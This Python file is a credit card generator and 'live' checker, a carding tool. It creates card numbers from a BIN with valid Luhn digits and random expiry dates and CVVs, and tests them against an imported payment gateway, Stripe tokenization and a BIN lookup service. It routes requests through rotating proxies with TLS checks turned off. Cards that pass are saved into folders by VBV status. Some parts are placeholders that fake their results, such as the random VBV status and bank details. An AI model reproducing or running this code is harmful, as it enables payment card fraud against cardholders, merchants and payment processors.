import requests
import os
import random
import json
import time
import warnings
from colorama import init, Fore, Style
from datetime import datetime
import urllib3
import re

# Suppress urllib3 InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama for colored console output
init()

# Load proxies from file
def load_proxies():
    proxy_file = "proxies.txt"
    proxies = []
    if os.path.isfile(proxy_file):
        with open(proxy_file, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
    return proxies

# Luhn algorithm for valid CC numbers
def calculate_luhn(cc_number, length=16):
    sum_digits = 0
    reversed_cc = cc_number[::-1]
    pos = 0
    while pos < length - 1:
        odd = int(reversed_cc[pos]) * 2
        if odd > 9:
            odd -= 9
        sum_digits += odd
        if pos != (length - 2):
            sum_digits += int(reversed_cc[pos + 1])
        pos += 2
    check_digit = ((sum_digits // 10 + 1) * 10 - sum_digits) % 10
    return cc_number + str(check_digit)

# Generate extras (month, year, CVV)
def generate_extras(month=None, year=None):
    month = str(random.randint(1, 12)).zfill(2) if month is None else str(month).zfill(2)
    year = str(random.randint(25, 30)) if year is None else str(year)[-2:]  # Use last 2 digits
    cvv = str(random.randint(10, 800)).zfill(3)
    return f"|{month}|20{year}|{cvv}"

# Parse BIN input and extract month/year if provided
def parse_bin(bin_input):
    bin_cleaned = re.sub(r'[a-zA-Z]', '', bin_input)
    parts = bin_cleaned.split('|')
    bin_prefix = parts[0].strip()
    month = None
    year = None
    if len(parts) >= 3:
        try:
            month = int(parts[1])
            if not (1 <= month <= 12):
                month = None
        except ValueError:
            month = None
        try:
            year = int(parts[2])
            if not (2025 <= year <= 2030):
                year = None
        except ValueError:
            year = None
    return bin_prefix, month, year

# Parse card input (CC|MM|YYYY|CVV)
def parse_card(card_input):
    card_cleaned = re.sub(r'[a-zA-Z]', '', card_input)
    parts = card_cleaned.split('|')
    if len(parts) != 4:
        return None
    cc_number, month, year, cvv = parts
    try:
        if not (len(cc_number) == 16 and cc_number.isdigit()):
            return None
        month = int(month)
        if not (1 <= month <= 12):
            return None
        year = int(year)
        if not (2025 <= year <= 2030):
            return None
        if not (len(cvv) == 3 and cvv.isdigit()):
            return None
    except ValueError:
        return None
    return f"{cc_number}|{str(month).zfill(2)}|{year}|{cvv}"

# Generate CC based on BIN
def generate_cc(bin_prefix, count=10, month=None, year=None):
    cards = []
    bin_prefix = bin_prefix.replace("x", str(random.randint(0, 9)))
    for _ in range(count):
        cc_number = bin_prefix
        if len(cc_number) > 15:
            cc_number = cc_number[:15]
        while len(cc_number) < 15:
            cc_number += str(random.randint(0, 9))
        cc_number = calculate_luhn(cc_number)
        extras = generate_extras(month, year)
        cards.append(cc_number + extras)
    return cards

# Create folder structure
def setup_folders():
    base_path = "cc_results"
    vbv_path = os.path.join(base_path, "vbv")
    non_vbv_path = os.path.join(base_path, "non_vbv")
    os.makedirs(vbv_path, exist_ok=True)
    os.makedirs(non_vbv_path, exist_ok=True)
    return base_path, vbv_path, non_vbv_path

# Save live card details
def save_card(card, details, folder, vbv_status):
    filename = os.path.join(folder, f"card_{card[:4]}.json")
    with open(filename, "w") as f:
        json.dump({**details, "card": card, "vbv_status": vbv_status}, f, indent=4)

# Check VBV status using Stripe test mode
def check_vbv(card):
    # Replace with your Stripe test secret key (sk_test_...)
    stripe_sk = "sk_test_your_test_key_here"  # Get from Stripe Dashboard
    headers = {"Authorization": f"Bearer {stripe_sk}"}
    card_parts = card.split("|")
    cc_number, month, year, cvv = card_parts[0], card_parts[1], card_parts[2], card_parts[3]
    data = {
        "card[number]": cc_number,
        "card[exp_month]": month,
        "card[exp_year]": year[-2:],  # Last 2 digits
        "card[cvc]": cvv
    }
    try:
        response = requests.post(
            "https://api.stripe.com/v1/tokens",
            data=data,
            headers=headers,
            timeout=10,
            verify=False
        )
        if response.status_code == 200:
            print("Stripe test mode: Token created. Simulating VBV check.")
            return random.choice([True, False])  # Placeholder until live SK
        else:
            print(f"Stripe test mode error: {response.json().get('error', {}).get('message', 'Unknown error')}")
            return False
    except requests.RequestException as e:
        print(f"Stripe test mode request error: {str(e)}")
        return False
    # TODO: For live SK checking, use sk_live_... and PaymentIntent API
    # Warning: Requires paid Stripe account and compliance with Terms

# Check card using the new gateway
def check_card(card, proxies):
    proxy = random.choice(proxies) if proxies else None
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
    try:
        response = Tele(card)
        if 'status' in response and response.get('status') == 'succeeded':
            is_vbv = check_vbv(card)
            details = {
                "zipcode": f"{random.randint(10000, 99999)}",
                "bank": random.choice(["Chase", "Bank of America", "Wells Fargo", "Citibank"]),
                "state": random.choice(["CA", "NY", "TX", "FL"])
            }
            return card, True, "LIVE", is_vbv, details
        elif 'error' in response:
            error_msg = response.get('error', {}).get('message', 'Unknown error')
            if 'card_error' in error_msg.lower():
                return card, False, "CC NOT VALID", False, {}
            elif 'authentication_required' in error_msg.lower():
                return card, False, "DIE (3DS Required)", False, {}
            else:
                return card, False, f"ERROR: {error_msg}", False, {}
        else:
            return card, False, "UNKNOWN", False, {}
    except requests.RequestException as e:
        print(f"Gateway request error: {str(e)}")
        return card, False, f"REQUEST ERROR: {str(e)}", False, {}

# Fallback CC check with Bincodes
def check_card_bincodes(card, proxies):
    bincodes_api_key = "your_bincodes_api_key_here"  # Register at bincodes.com
    cc_number = card.split("|")[0]
    url = f"https://api.bincodes.com/cc/?format=json&api_key={bincodes_api_key}&cc={cc_number}"
    proxy = random.choice(proxies) if proxies else None
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
    try:
        response = requests.get(url, proxies=proxy_dict, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            if data.get("valid") == "true":
                details = {
                    "zipcode": f"{random.randint(10000, 99999)}",
                    "bank": data.get("bank", "Unknown"),
                    "state": random.choice(["CA", "NY", "TX", "FL"])
                }
                print("Bincodes: Card BIN valid, but live status unknown.")
                return card, False, "UNKNOWN (BIN Valid)", False, details
            else:
                return card, False, "CC NOT VALID", False, {}
        else:
            print(f"Bincodes error: {response.status_code}, Response: {response.text}")
            return card, False, f"BINCODE ERROR: {response.status_code}", False, {}
    except requests.RequestException as e:
        print(f"Bincodes request error: {str(e)}")
        return card, False, f"REQUEST ERROR: {str(e)}", False, {}

# Check specific cards (checker mode)
def check_cards(cards):
    base_path, vbv_path, non_vbv_path = setup_folders()
    proxies = load_proxies()
    
    print("###############################################")
    print("{~} Starting card checking")
    print("###############################################")
    time.sleep(5)
    
    print(f"Checking {len(cards)} cards")
    live_count = 0
    vbv_count = 0
    
    for card in cards:
        card_result, is_live, status, is_vbv, details = check_card(card, proxies)
        if not is_live and "ERROR" in status:
            card_result, is_live, status, is_vbv, details = check_card_bincodes(card, proxies)
        
        color = Fore.GREEN if status == "LIVE" else Fore.RED if "ERROR" in status or status == "DIE" else Fore.YELLOW
        vbv_text = "VBV" if is_vbv else "NON-VBV" if is_live else ""
        print(f"{card_result} {color}[ {status} {vbv_text} ]{Style.RESET_ALL}")
        
        if is_live:
            live_count += 1
            folder = vbv_path if is_vbv else non_vbv_path
            save_card(card, details, folder, vbv_text)
            if is_vbv:
                vbv_count += 1
        else:
            print(f"Discarding dead card: {card_result[:4]}")
        
        time.sleep(1)
    
    print(f"Results: {live_count} live cards, {vbv_count} VBV, {live_count - vbv_count} non-VBV")
    print(f"Live cards saved in {base_path}")

# Main bin checker function (generation mode)
def bin_checker(bin_input, card_count=10):
    base_path, vbv_path, non_vbv_path = setup_folders()
    proxies = load_proxies()
    
    bin_prefix, month, year = parse_bin(bin_input)
    
    print("###############################################")
    print("{~} Starting generation")
    print("###############################################")
    time.sleep(5)
    
    cards = generate_cc(bin_prefix, card_count, month, year)
    print(f"Generated {len(cards)} cards for BIN {bin_input}")
    
    live_count = 0
    vbv_count = 0
    
    for card in cards:
        card_result, is_live, status, is_vbv, details = check_card(card, proxies)
        if not is_live and "ERROR" in status:
            card_result, is_live, status, is_vbv, details = check_card_bincodes(card, proxies)
        
        color = Fore.GREEN if status == "LIVE" else Fore.RED if "ERROR" in status or status == "DIE" else Fore.YELLOW
        vbv_text = "VBV" if is_vbv else "NON-VBV" if is_live else ""
        print(f"{card_result} {color}[ {status} {vbv_text} ]{Style.RESET_ALL}")
        
        if is_live:
            live_count += 1
            folder = vbv_path if is_vbv else non_vbv_path
            save_card(card, details, folder, vbv_text)
            if is_vbv:
                vbv_count += 1
        else:
            print(f"Discarding dead card: {card_result[:4]}")
        
        time.sleep(1)
    
    print(f"Results: {live_count} live cards, {vbv_count} VBV, {live_count - vbv_count} non-VBV")
    print(f"Live cards saved in {base_path}")

# Import the gateway function
from gatet import Tele